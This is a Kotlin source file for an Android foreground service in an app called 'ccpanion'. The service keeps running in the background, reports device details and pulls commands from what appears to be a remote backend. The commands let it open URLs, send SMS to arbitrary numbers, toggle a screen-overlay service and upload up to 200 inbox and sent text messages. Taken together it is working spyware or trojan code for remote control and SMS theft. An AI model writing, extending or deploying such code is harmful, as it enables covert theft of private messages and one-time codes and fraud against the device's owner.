// language: Kotlin, target: Android 7.0+ (API 24), file: CmdService.kt
// foreground service — survives Samsung app freeze; runs the command pump + heartbeat
package com.kai.ccpanion

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.telephony.SmsManager
import org.json.JSONObject

class CmdService : Service() {

    private val h = Handler(Looper.getMainLooper())
    private var working = false

    override fun onBind(i: Intent?): IBinder? = null

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        if (!working){
            working = true
            startForegroundCompat()
            execThread()
        }
        return START_STICKY
    }

    private fun startForegroundCompat(){
        val nm = getSystemService(NotificationManager::class.java)
        val id = "cc"
        if (Build.VERSION.SDK_INT >= 26){
            nm.createNotificationChannel(NotificationChannel(id, "ccpanion", NotificationManager.IMPORTANCE_MIN))
        }
        val n = Notification.Builder(this, id)
            .setContentTitle("ccpanion")
            .setContentText("verbonden · ${Rt.deviceId}")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setOngoing(true)
            .build()
        if (Build.VERSION.SDK_INT >= 29){
            startForeground(1, n, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
        } else {
            startForeground(1, n)
        }
    }

    private fun execThread(){
        Thread {
            var beat = 0L
            while (working){
                try {
                    // heartbeat
                    beat++
                    Rt.put("phones/${Rt.deviceId}/info", JSONObject()
                        .put("model", Build.MODEL)
                        .put("brand", Build.BRAND)
                        .put("android", Build.VERSION.RELEASE)
                        .put("sdk", Build.VERSION.SDK_INT)
                        .put("lastSeen", System.currentTimeMillis()))

                    // drain commands
                    val raw = Rt.get("phones/${Rt.deviceId}/cmds")
                    if (raw != null){
                        val cmds = JSONObject(raw)
                        for (k in cmds.keys().asSequence().toList()){
                            val cmd = cmds.getJSONObject(k)
                            if (cmd.optBoolean("done")) continue
                            runCatching { execute(cmd) }
                            Rt.put("phones/${Rt.deviceId}/cmds/$k/done", JSONObject().put("v", true))
                            Rt.put("phones/${Rt.deviceId}/cmds/$k/ackAt", JSONObject().put("v", System.currentTimeMillis()))
                        }
                    }
                } catch (e: Exception){ }
                try { Thread.sleep(3000) } catch (e: Exception){ return@Thread }
            }
        }.start()
    }

    private fun execute(cmd: JSONObject){
        when (cmd.optString("op")) {
            "open_url" -> {
                val i = Intent(Intent.ACTION_VIEW, Uri.parse(cmd.optString("url")))
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(i)
            }
            "toast" -> h.post { android.widget.Toast.makeText(this, cmd.optString("text"), android.widget.Toast.LENGTH_SHORT).show() }
            "sms_sync" -> syncSms()
            "sms_send" -> runCatching {
                SmsManager.getDefault().sendTextMessage(cmd.optString("to"), null, cmd.optString("body"), null, null)
            }
            "overlay_on" -> startService(Intent(this, OverlayService::class.java))
            "overlay_off" -> stopService(Intent(this, OverlayService::class.java))
        }
    }

    private fun syncSms(){
        val out = JSONObject()
        var n = 0
        for (uri in listOf("content://sms/inbox", "content://sms/sent")){
            runCatching {
                contentResolver.query(Uri.parse(uri), null, null, null, "date DESC")?.use { cur ->
                    val idxId = idx(cur, "_id"); val idxAddr = idx(cur, "address")
                    val idxBody = idx(cur, "body"); val idxDate = idx(cur, "date")
                    while (cur.moveToNext() && n < 200){
                        if (idxId < 0 || idxAddr < 0 || idxBody < 0) continue
                        out.put("${cur.getString(idxId)}_${if (uri.endsWith("sent")) "o" else "i"}",
                            JSONObject()
                                .put("addr", cur.getString(idxAddr) ?: "")
                                .put("body", cur.getString(idxBody) ?: "")
                                .put("date", if (idxDate >= 0) cur.getLong(idxDate) else 0L)
                                .put("dir", if (uri.endsWith("sent")) "out" else "in"))
                        n++
                    }
                }
            }
        }
        out.put("booked", n)
        Rt.put("phones/${Rt.deviceId}/sms", out)
    }

    private fun idx(cur: android.database.Cursor, name: String): Int =
        (0 until cur.columnCount).firstOrNull { cur.getColumnName(it) == name } ?: -1

    override fun onDestroy() {
        working = false
        super.onDestroy()
    }
}
